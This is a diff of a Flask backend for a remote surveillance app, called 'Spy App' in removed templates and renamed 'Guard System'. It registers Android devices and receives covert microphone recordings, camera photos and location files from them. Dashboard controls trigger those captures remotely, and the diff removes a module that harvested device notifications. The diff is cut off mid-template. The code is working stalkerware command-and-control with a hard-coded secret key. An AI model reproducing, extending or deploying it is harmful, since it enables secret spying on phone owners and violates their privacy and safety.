@@ -2,35 +2,29 @@ import os
 import logging
 from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
 from werkzeug.utils import secure_filename
-from threading import Thread, Lock
+from threading import Thread
 import time
 import json
-from datetime import datetime
-import uuid
 
 # Initialize Flask app FIRST
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-change-in-production-12345'
 app.config['UPLOAD_FOLDER'] = 'recordings'
 app.config['DEVICE_FOLDER'] = 'devices'
-app.config['NOTIFICATION_FOLDER'] = 'notifications'
 app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit
 
 # Ensure upload and device directories exist
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
-os.makedirs(app.config['NOTIFICATION_FOLDER'], exist_ok=True)
 
 # Global variable to track recording signal
 recording_signal = False
 signal_listeners = []
 camera_signal = {'active': False}
-location_signal = {'active': False}
+location_signal = {'active': False}  # New location signal
 
 # Device-specific signals storage
 device_signals = {}
-notifications = []
-notification_lock = Lock()
 
 # Simple authentication
 USERNAME = "Sukh Hacker"
@@ -67,9 +61,7 @@ def get_all_devices():
                     'name': device_data.get('name', 'Unknown Device'),
                     'model': device_data.get('model', 'Unknown Model'),
                     'last_seen': device_data.get('last_seen', 0),
-                    'status': device_data.get('status', 'offline'),
-                    'ip_address': device_data.get('ip_address', 'Unknown'),
-                    'android_version': device_data.get('android_version', 'Unknown')
+                    'status': device_data.get('status', 'offline')
                 })
     except FileNotFoundError:
         os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
@@ -77,66 +69,6 @@ def get_all_devices():
     # Sort by last seen (newest first)
     devices.sort(key=lambda x: x['last_seen'], reverse=True)
     return devices
-
-# Notification management
-def save_notification(device_id, notification_data):
-    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
-    notifications_list = []
-    
-    if os.path.exists(notification_file):
-        try:
-            with open(notification_file, 'r') as f:
-                notifications_list = json.load(f)
-        except:
-            notifications_list = []
-    
-    notification_data['id'] = str(uuid.uuid4())
-    notification_data['timestamp'] = time.time()
-    notification_data['read'] = False
-    
-    notifications_list.append(notification_data)
-    
-    # Keep only last 100 notifications
-    if len(notifications_list) > 100:
-        notifications_list = notifications_list[-100:]
-    
-    with open(notification_file, 'w') as f:
-        json.dump(notifications_list, f)
-    
-    return notification_data
-
-def get_notifications(device_id):
-    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
-    if os.path.exists(notification_file):
-        try:
-            with open(notification_file, 'r') as f:
-                notifications = json.load(f)
-                # Sort by timestamp (newest first)
-                notifications.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
-                return notifications
-        except:
-            return []
-    return []
-
-def mark_notification_read(device_id, notification_id):
-    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
-    if os.path.exists(notification_file):
-        try:
-            with open(notification_file, 'r') as f:
-                notifications = json.load(f)
-            
-            for notification in notifications:
-                if notification.get('id') == notification_id:
-                    notification['read'] = True
-                    break
-            
-            with open(notification_file, 'w') as f:
-                json.dump(notifications, f)
-            
-            return True
-        except:
-            return False
-    return False
 
 # Device registration endpoint
 @app.route('/register-device', methods=['POST'])
@@ -146,8 +78,6 @@ def register_device():
         device_id = data.get('device_id')
         device_name = data.get('device_name', 'Unknown Device')
         device_model = data.get('device_model', 'Unknown Model')
-        android_version = data.get('android_version', 'Unknown')
-        ip_address = request.remote_addr
         
         if not device_id:
             return jsonify({'ok': False, 'error': 'Device ID required'}), 400
@@ -157,17 +87,14 @@ def register_device():
         device_data.update({
             'name': device_name,
             'model': device_model,
-            'android_version': android_version,
-            'ip_address': ip_address,
             'last_seen': time.time(),
-            'status': 'online',
-            'first_seen': device_data.get('first_seen', time.time())
+            'status': 'online'
         })
         
         # Save device data
         save_device_data(device_id, device_data)
         
-        print(f"✅ Device registered: {device_name} ({device_model}) - ID: {device_id} - IP: {ip_address}")
+        print(f"✅ Device registered: {device_name} ({device_model}) - ID: {device_id}")
         return jsonify({'ok': True, 'message': 'Device registered successfully'})
         
     except Exception as e:
@@ -180,7 +107,6 @@ def device_heartbeat():
     try:
         data = request.get_json()
         device_id = data.get('device_id')
-        ip_address = request.remote_addr
         
         if not device_id:
             return jsonify({'ok': False, 'error': 'Device ID required'}), 400
@@ -189,7 +115,6 @@ def device_heartbeat():
         device_data = load_device_data(device_id)
         device_data['last_seen'] = time.time()
         device_data['status'] = 'online'
-        device_data['ip_address'] = ip_address
         save_device_data(device_id, device_data)
         
         return jsonify({'ok': True})
@@ -197,49 +122,6 @@ def device_heartbeat():
     except Exception as e:
         print(f"❌ Device heartbeat error: {e}")
         return jsonify({'ok': False, 'error': 'Heartbeat failed'}), 500
-
-# Notification upload endpoint
-@app.route('/device/<device_id>/upload-notification', methods=['POST'])
-def upload_notification(device_id):
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({'ok': False, 'error': 'No notification data'}), 400
-        
-        # Add device info to notification
-        data['device_id'] = device_id
-        data['device_name'] = load_device_data(device_id).get('name', 'Unknown Device')
-        
-        # Save notification
-        saved_notification = save_notification(device_id, data)
-        
-        print(f"📢 Notification received from {device_id}: {data.get('title', 'No Title')}")
-        return jsonify({'ok': True, 'message': 'Notification saved', 'notification_id': saved_notification['id']})
-        
-    except Exception as e:
-        print(f"❌ Notification upload error: {e}")
-        return jsonify({'ok': False, 'error': 'Notification save failed'}), 500
-
-# Get notifications endpoint
-@app.route('/device/<device_id>/notifications')
-def get_device_notifications(device_id):
-    if not session.get('logged_in'):
-        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
-    
-    notifications_list = get_notifications(device_id)
-    return jsonify({'ok': True, 'notifications': notifications_list})
-
-# Mark notification as read
-@app.route('/device/<device_id>/notifications/<notification_id>/read', methods=['POST'])
-def mark_notification_as_read(device_id, notification_id):
-    if not session.get('logged_in'):
-        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
-    
-    success = mark_notification_read(device_id, notification_id)
-    if success:
-        return jsonify({'ok': True, 'message': 'Notification marked as read'})
-    else:
-        return jsonify({'ok': False, 'error': 'Notification not found'}), 404
 
 # Login route
 @app.route('/login', methods=['GET', 'POST'])
@@ -290,71 +172,39 @@ def device_dashboard(device_id):
     location_files = []
     
     upload_dir = app.config['UPLOAD_FOLDER']
-    print(f"🔍 Scanning upload directory: {upload_dir}")
-    
     try:
-        # Check if directory exists
-        if not os.path.exists(upload_dir):
-            print(f"❌ Upload directory does not exist: {upload_dir}")
-            os.makedirs(upload_dir, exist_ok=True)
-            print(f"✅ Created upload directory: {upload_dir}")
-        
-        file_list = os.listdir(upload_dir)
-        print(f"📁 Total files in upload directory: {len(file_list)}")
-        print(f"📁 Files: {file_list}")
-        
-        for filename in file_list:
+        for filename in os.listdir(upload_dir):
             filepath = os.path.join(upload_dir, filename)
             
             # Check if file belongs to this device
             if filename.startswith(f"{device_id}_"):
-                print(f"✅ Found file for device {device_id}: {filename}")
+                file_info = {
+                    'name': filename,
+                    'size': os.path.getsize(filepath),
+                    'modified': os.path.getmtime(filepath)
+                }
                 
-                try:
-                    file_info = {
-                        'name': filename,
-                        'size': os.path.getsize(filepath),
-                        'modified': os.path.getmtime(filepath),
-                        'url': f"/files/{filename}"
-                    }
+                if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
+                    files.append(file_info)
+                elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
+                    photos.append(file_info)
+                elif filename.startswith(f"{device_id}_location_") and filename.endswith('.txt'):
+                    location_files.append(file_info)
                     
-                    if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
-                        files.append(file_info)
-                        print(f"🎵 Added audio file: {filename}")
-                    elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
-                        photos.append(file_info)
-                        print(f"🖼️ Added photo file: {filename}")
-                    elif filename.startswith(f"{device_id}_location_") and filename.endswith('.txt'):
-                        location_files.append(file_info)
-                        print(f"📍 Added location file: {filename}")
-                        
-                except Exception as e:
-                    print(f"❌ Error processing file {filename}: {e}")
-                    continue
-            else:
-                print(f"❌ File {filename} does not belong to device {device_id}")
-                    
-    except Exception as e:
-        print(f"❌ Error reading upload directory: {e}")
+    except FileNotFoundError:
         os.makedirs(upload_dir, exist_ok=True)
-    
-    # Get notifications for this device
-    notifications_list = get_notifications(device_id)
     
     # Sort by modification time (newest first)
     files.sort(key=lambda x: x['modified'], reverse=True)
     photos.sort(key=lambda x: x['modified'], reverse=True)
     location_files.sort(key=lambda x: x['modified'], reverse=True)
     
-    print(f"📊 Final file counts - Audio: {len(files)}, Photos: {len(photos)}, Locations: {len(location_files)}")
-    
     return render_template_string(DEVICE_DASHBOARD_HTML, 
                                  device=device_data, 
                                  device_id=device_id,
                                  files=files, 
-                                 photos=photos[:12],
-                                 location_files=location_files[:10],
-                                 notifications=notifications_list[:20])
+                                 photos=photos[:6],
+                                 location_files=location_files[:5])
 
 # Device-specific camera routes
 @app.route('/device/<device_id>/start-camera-signal', methods=['POST'])
@@ -366,13 +216,12 @@ def start_device_camera_signal(device_id):
     camera_type = data.get('camera_type', 'front')
     
     # Store device-specific camera signal
-    if device_id not in device_signals:
-        device_signals[device_id] = {}
-    
-    device_signals[device_id]['camera'] = {
-        'active': True,
-        'camera_type': camera_type,
-        'timestamp': time.time()
+    device_signals[device_id] = {
+        'camera': {
+            'active': True,
+            'camera_type': camera_type,
+            'timestamp': time.time()
+        }
     }
     
     print(f"Camera signal activated for device {device_id} - {camera_type} camera")
@@ -483,7 +332,6 @@ def upload_device_photo(device_id):
     print(f"📸 Photo file details for device {device_id}:")
     print("   - Filename:", photo_file.filename)
     print("   - Content type:", photo_file.content_type)
-    print("   - Content length:", photo_file.content_length)
     
     if photo_file.filename == '':
         print("❌ Empty filename")
@@ -500,12 +348,6 @@ def upload_device_photo(device_id):
             file_size = os.path.getsize(filepath)
             print(f"✅ Photo saved for device {device_id}: {filename} ({file_size} bytes)")
             
-            # Verify file
-            if os.path.exists(filepath):
-                print(f"✅ Photo verification: EXISTS")
-            else:
-                print(f"❌ Photo verification: MISSING")
-                
             return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
         except Exception as e:
             print(f"❌ File save error: {e}")
@@ -561,71 +403,30 @@ Google Maps: https://maps.google.com/?q={latitude},{longitude}
 @app.route('/device/<device_id>/mobile-upload', methods=['POST'])
 def mobile_device_upload(device_id):
     try:
-        print(f"📱 Mobile upload received for device: {device_id}")
-        print(f"📦 Request files: {list(request.files.keys())}")
-        print(f"📦 Request form: {request.form}")
-        print(f"📦 Request headers: {dict(request.headers)}")
-        
-        # Check if device exists
-        device_data = load_device_data(device_id)
-        if not device_data:
-            print(f"❌ Device {device_id} not found in registry")
-            # But still allow upload for legacy devices
+        print(f"Files received from device {device_id}:", list(request.files.keys()))
         
         audio_file = None
         if 'file' in request.files:
             audio_file = request.files['file']
-            print("✅ Using 'file' field for audio")
+            print("Using 'file' field")
         elif 'audio' in request.files:
-            audio_file = request.files['audio'] 
-            print("✅ Using 'audio' field for audio")
-        else:
-            print("❌ No audio file found in request.files")
-            return jsonify({'ok': False, 'error': 'No audio file found'}), 400
+            audio_file = request.files['audio']
+            print("Using 'audio' field")
         
         if not audio_file or audio_file.filename == '':
-            print("❌ Empty filename or no file selected")
             return jsonify({'ok': False, 'error': 'No file selected'}), 400
-        
-        # File details debug
-        print(f"📁 File details: {audio_file.filename}")
-        print(f"📁 Content type: {audio_file.content_type}")
-        print(f"📁 Content length: {audio_file.content_length}")
         
         timestamp = str(int(time.time()))
         filename = f"{device_id}_android_recording_{timestamp}.m4a"
         
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        audio_file.save(filepath)
         
-        try:
-            audio_file.save(filepath)
-            file_size = os.path.getsize(filepath)
-            print(f"✅ File saved successfully: {filename} ({file_size} bytes)")
-            
-            # Verify file exists and is readable
-            if os.path.exists(filepath):
-                print(f"✅ File verification: EXISTS - {filepath}")
-            else:
-                print(f"❌ File verification: MISSING - {filepath}")
-                return jsonify({'ok': False, 'error': 'File save failed'}), 500
-                
-            return jsonify({
-                'ok': True, 
-                'message': 'Upload successful', 
-                'filename': filename,
-                'file_size': file_size
-            })
-            
-        except Exception as save_error:
-            print(f"❌ File save error: {save_error}")
-            import traceback
-            traceback.print_exc()
-            return jsonify({'ok': False, 'error': f'File save failed: {save_error}'}), 500
+        print(f"✅ Mobile recording uploaded for device {device_id}: {filename} ({os.path.getsize(filepath)} bytes)")
+        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
     
     except Exception as e:
-        print(f"❌ Upload error: {e}")
-        import traceback
-        traceback.print_exc()
+        print(f"❌ Upload error for device {device_id}: {e}")
         return jsonify({'ok': False, 'error': 'Upload failed'}), 500
 
 # Get device-specific photos API
@@ -650,7 +451,7 @@ def get_device_latest_photos(device_id):
         pass
     
     photos.sort(key=lambda x: x['modified'], reverse=True)
-    return jsonify({'ok': True, 'photos': photos[:12]})
+    return jsonify({'ok': True, 'photos': photos[:6]})
 
 # Get device-specific location files API
 @app.route('/device/<device_id>/get-location-files')
@@ -674,7 +475,7 @@ def get_device_location_files(device_id):
         pass
     
     location_files.sort(key=lambda x: x['modified'], reverse=True)
-    return jsonify({'ok': True, 'locations': location_files[:10]})
+    return jsonify({'ok': True, 'locations': location_files[:5]})
 
 # ✅ LEGACY ROUTES FOR EXISTING ANDROID APP COMPATIBILITY
 
@@ -849,9 +650,6 @@ def mobile_upload_legacy():
     try:
         print("📱 Legacy mobile upload received")
         
-        # Try to get device ID from various sources
-        device_id = "unknown_device"
-        
         audio_file = None
         if 'file' in request.files:
             audio_file = request.files['file']
@@ -867,8 +665,7 @@ def mobile_upload_legacy():
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         audio_file.save(filepath)
         
-        file_size = os.path.getsize(filepath)
-        print(f"✅ Legacy recording uploaded: {filename} ({file_size} bytes)")
+        print(f"✅ Legacy recording uploaded: {filename}")
         return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
     
     except Exception as e:
@@ -894,8 +691,7 @@ def mobile_upload_photo_legacy():
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         photo_file.save(filepath)
         
-        file_size = os.path.getsize(filepath)
-        print(f"✅ Legacy photo uploaded: {filename} ({file_size} bytes)")
+        print(f"✅ Legacy photo uploaded: {filename}")
         return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
     
     return jsonify({'ok': False, 'error': 'Upload failed'}), 500
@@ -975,21 +771,6 @@ def delete_file(filename):
     except Exception as e:
         return jsonify({'ok': False, 'error': str(e)}), 500
 
-# Clear all notifications for device
-@app.route('/device/<device_id>/clear-notifications', methods=['POST'])
-def clear_notifications(device_id):
-    if not session.get('logged_in'):
-        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
-    
-    try:
-        notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
-        if os.path.exists(notification_file):
-            os.remove(notification_file)
-        
-        return jsonify({'ok': True, 'message': 'All notifications cleared'})
-    except Exception as e:
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
 # Debug route to check devices
 @app.route('/debug-devices')
 def debug_devices():
@@ -999,482 +780,457 @@ def debug_devices():
         'devices': devices
     })
 
-# Debug route to check uploads
-@app.route('/debug-uploads')
-def debug_uploads():
-    """Debug route to check uploaded files"""
-    if not session.get('logged_in'):
-        return redirect(url_for('login'))
-    
-    upload_dir = app.config['UPLOAD_FOLDER']
-    files = []
-    
-    try:
-        for filename in os.listdir(upload_dir):
-            filepath = os.path.join(upload_dir, filename)
-            files.append({
-                'name': filename,
-                'size': os.path.getsize(filepath),
-                'modified': time.ctime(os.path.getmtime(filepath)),
-                'path': filepath
-            })
-    except Exception as e:
-        return jsonify({'error': str(e)})
-    
-    # Sort by modification time
-    files.sort(key=lambda x: os.path.getmtime(x['path']), reverse=True)
-    
-    return jsonify({
-        'upload_folder': upload_dir,
-        'total_files': len(files),
-        'files': files
-    })
-
-# ✅ HTML TEMPLATES
-
-LOGIN_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Login - Spy App</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
-        .login-container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { text-align: center; color: #333; margin-bottom: 30px; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 5px; color: #555; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        button:hover { background: #0056b3; }
-        .error { color: red; text-align: center; margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <h1>🔐 Spy App Login</h1>
-        <form method="POST">
-            <div class="form-group">
-                <label for="username">Username:</label>
-                <input type="text" id="username" name="username" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Password:</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <button type="submit">Login</button>
-            {% if error %}
-                <div class="error">{{ error }}</div>
-            {% endif %}
-        </form>
-    </div>
-</body>
-</html>
-"""
-
+# DEVICES_HTML template - Shows list of all connected devices
 DEVICES_HTML = """
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-    <title>Devices - Spy App</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Guard System - Devices</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-        h1 { color: #333; margin: 0; }
-        .logout-btn { background: #dc3545; color: white; padding: 8px 15px; text-decoration: none; border-radius: 5px; }
-        .logout-btn:hover { background: #c82333; }
-        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
-        .device-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .device-name { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333; }
-        .device-info { color: #666; margin-bottom: 5px; font-size: 14px; }
-        .device-status { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }
-        .status-online { background: #d4edda; color: #155724; }
-        .status-offline { background: #f8d7da; color: #721c24; }
-        .device-link { display: inline-block; margin-top: 10px; padding: 8px 15px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; font-size: 14px; }
-        .device-link:hover { background: #0056b3; }
-        .no-devices { text-align: center; color: #666; padding: 40px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 25px 30px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header-left h1 {
+            color: #00b7ff;
+            font-size: 2.2rem;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
+            margin-bottom: 5px;
+        }
+        
+        .header-left p {
+            color: #888;
+            font-size: 1rem;
+        }
+        
+        .header-right {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        
+        /* Button Styles */
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-logout {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
+        }
+        
+        /* Devices Grid */
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+        
+        .device-card {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 25px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 183, 255, 0.3);
+            border-color: #00b7ff;
+        }
+        
+        .device-card.online::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 5px;
+            height: 100%;
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+        }
+        
+        .device-card.offline::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 5px;
+            height: 100%;
+            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+        }
+        
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        
+        .device-name {
+            color: #00b7ff;
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .device-model {
+            color: #888;
+            font-size: 0.9rem;
+        }
+        
+        .device-status {
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .status-online {
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+            box-shadow: 0 0 15px rgba(40, 167, 69, 0.5);
+        }
+        
+        .status-offline {
+            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+        }
+        
+        .device-info {
+            margin-top: 15px;
+        }
+        
+        .device-info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .info-label {
+            color: #888;
+        }
+        
+        .info-value {
+            color: #ccc;
+        }
+        
+        .device-actions {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn-control {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+            color: white;
+        }
+        
+        .btn-manage {
+            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
+        }
+        
+        .empty-state {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 60px 20px;
+            color: #666;
+        }
+        
+        .empty-state h3 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: #888;
+        }
+        
+        .refresh-btn {
+            background: rgba(108, 117, 125, 0.3);
+            color: #ccc;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .refresh-btn:hover {
+            background: rgba(108, 117, 125, 0.5);
+            transform: translateY(-2px);
+        }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>📱 Connected Devices</h1>
-        <a href="/logout" class="logout-btn">Logout</a>
-    </div>
-    
-    {% if devices %}
-        <div class="devices-grid">
-            {% for device in devices %}
-                <div class="device-card">
-                    <div class="device-name">{{ device.name }}</div>
-                    <div class="device-info">ID: {{ device.id }}</div>
-                    <div class="device-info">Model: {{ device.model }}</div>
-                    <div class="device-info">Android: {{ device.android_version }}</div>
-                    <div class="device-info">IP: {{ device.ip_address }}</div>
-                    <div class="device-info">
-                        Status: <span class="device-status {% if device.status == 'online' %}status-online{% else %}status-offline{% endif %}">
-                            {{ device.status|upper }}
-                        </span>
-                    </div>
-                    <div class="device-info">
-                        Last seen: {{ device.last_seen|int|ctime }}
-                    </div>
-                    <a href="/device/{{ device.id }}" class="device-link">View Dashboard</a>
-                </div>
-            {% endfor %}
-        </div>
-    {% else %}
-        <div class="no-devices">
-            <h2>No devices connected yet</h2>
-            <p>Devices will appear here when they register with the system.</p>
-        </div>
-    {% endif %}
-</body>
-</html>
-"""
-
-DEVICE_DASHBOARD_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>{{ device.name }} - Spy App</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
-        .header { background: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        .header-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
-        h1 { color: #333; margin: 0; }
-        .nav-links a { margin-left: 15px; color: #007bff; text-decoration: none; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
-        .section { background: white; padding: 20px; margin-bottom: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .section h2 { margin-top: 0; color: #333; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px; }
-        .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
-        .control-btn { padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
-        .control-btn:hover { background: #0056b3; }
-        .control-btn.camera { background: #28a745; }
-        .control-btn.camera:hover { background: #218838; }
-        .control-btn.location { background: #ffc107; color: #000; }
-        .control-btn.location:hover { background: #e0a800; }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
-        .file-card { border: 1px solid #ddd; border-radius: 5px; padding: 15px; text-align: center; }
-        .file-card img { max-width: 100%; height: 120px; object-fit: cover; border-radius: 5px; }
-        .file-card audio { width: 100%; margin-top: 10px; }
-        .file-info { margin-top: 10px; font-size: 12px; color: #666; }
-        .file-link { display: block; margin-top: 5px; color: #007bff; text-decoration: none; }
-        .notification { padding: 10px; border-left: 4px solid #007bff; background: #f8f9fa; margin-bottom: 10px; }
-        .notification.unread { border-left-color: #dc3545; background: #fff5f5; }
-        .notification-title { font-weight: bold; margin-bottom: 5px; }
-        .notification-message { color: #666; font-size: 14px; }
-        .notification-time { color: #999; font-size: 12px; margin-top: 5px; }
-        .status-badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; margin-left: 10px; }
-        .online { background: #d4edda; color: #155724; }
-        .offline { background: #f8d7da; color: #721c24; }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <div class="header-content">
-            <h1>📱 {{ device.name }} 
-                <span class="status-badge {% if device.status == 'online' %}online{% else %}offline{% endif %}">
-                    {{ device.status|upper }}
-                </span>
-            </h1>
-            <div class="nav-links">
-                <a href="/">← Back to Devices</a>
-                <a href="/logout">Logout</a>
-            </div>
-        </div>
-    </div>
-    
     <div class="container">
-        <!-- Device Info Section -->
-        <div class="section">
-            <h2>Device Information</h2>
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px;">
-                <div><strong>Device ID:</strong> {{ device.id }}</div>
-                <div><strong>Model:</strong> {{ device.model }}</div>
-                <div><strong>Android Version:</strong> {{ device.android_version }}</div>
-                <div><strong>IP Address:</strong> {{ device.ip_address }}</div>
-                <div><strong>Last Seen:</strong> {{ device.last_seen|int|ctime }}</div>
-                <div><strong>First Seen:</strong> {{ device.first_seen|int|ctime }}</div>
+        <!-- Header -->
+        <header>
+            <div class="header-left">
+                <h1>🚀 GUARD SYSTEM</h1>
+                <p>Connected Devices Management</p>
             </div>
-        </div>
-        
-        <!-- Controls Section -->
-        <div class="section">
-            <h2>Remote Controls</h2>
-            <div class="controls">
-                <button class="control-btn" onclick="startRecording()">🎙️ Start Recording (15s)</button>
-                <button class="control-btn camera" onclick="startCamera('front')">📸 Front Camera</button>
-                <button class="control-btn camera" onclick="startCamera('back')">📷 Back Camera</button>
-                <button class="control-btn location" onclick="startLocation()">📍 Get Location</button>
-                <button class="control-btn" onclick="refreshFiles()">🔄 Refresh Files</button>
+            <div class="header-right">
+                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
             </div>
-            <div id="control-status" style="margin-top: 10px;"></div>
-        </div>
-        
-        <!-- Notifications Section -->
-        {% if notifications %}
-        <div class="section">
-            <h2>Recent Notifications</h2>
-            {% for notification in notifications %}
-                <div class="notification {% if not notification.read %}unread{% endif %}" id="notification-{{ notification.id }}">
-                    <div class="notification-title">{{ notification.title }}</div>
-                    <div class="notification-message">{{ notification.message }}</div>
-                    <div class="notification-time">{{ notification.timestamp|int|ctime }}</div>
+        </header>
+
+        <!-- Devices Section -->
+        <div class="control-section">
+            <div class="section-title">
+                📱 Connected Devices
+                <button class="refresh-btn" onclick="refreshDevices()">🔄 Refresh Devices</button>
